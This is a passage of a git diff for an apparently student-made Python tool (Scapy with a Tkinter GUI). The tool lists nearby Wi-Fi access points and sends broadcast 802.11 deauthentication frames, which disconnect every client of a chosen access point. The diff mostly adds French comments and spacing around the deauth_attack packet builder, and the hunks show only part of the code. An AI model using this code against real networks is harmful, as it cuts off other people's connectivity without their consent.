@@ -62,7 +62,7 @@ def check_device():  # check si le mode monitor est disponible sur l'interface c
         return True
 
 
-# ========================================== ATTACK & GUI
+# ========================================== ATTACK & GUI confs
 stop_event = threading.Event()  # Multi-threading pour pouvoir lancer une boucle infinie sans faire crasher le programme (lors de l'arrêt)
 
 
@@ -126,11 +126,13 @@ def refresh():  # fonction liée au bouton refresh -> capture des macs et des no
         AP_list.append(t[0][i])
 
 
+        
 def deauth_attack():  # Contructeur de paquets Deauth
     AP_MAC = current_ap
     CLIENT_MAC = "ff:ff:ff:ff:ff:ff"  # Cible en broadcast-> deconnexion des appareils connectés au point d'accès choisit (spécifié dans AP_MAC)
-
-    packet = RadioTap() / \
+        
+    # variable contenant une radio tap contenant elle même des informations sur la couche physique pour le paquets de deauth
+    packet = RadioTap() / \ 
              Dot11( \
                  type=0,
                  subtype=12,
@@ -143,9 +145,11 @@ def deauth_attack():  # Contructeur de paquets Deauth
     scapy.sendp(packet, iface=iface)
 
 
+        
 def aboutButton():
     messagebox.showinfo(title,
                         "Program created by Uysse & Jean-Baptiste during SAE 304.\n\nHow to use it:\n1st: Refresh the list ↻\n\n2nd: Select a channel for the targeted AP.\n\n3rd: Start deauthentication attack !")
+
 
 
 def changeInt(select):
@@ -153,12 +157,14 @@ def changeInt(select):
     iface = select
 
 
+        
 def onselect(evt):
     global current_ap
     current_ap = liste.get(liste.curselection()[0])
     current_ap = current_ap.split("(")[1].split(")")[0].split(" ")[1]
 
 
+# ========================================== Interface graphique 
 t = [
     []]  # L'ensemble du design de la fenêtre (taille et redimensionnement d'image-> selon ), labels, boutons, entrée utilisateur, listbox etc
 current_ap = ""
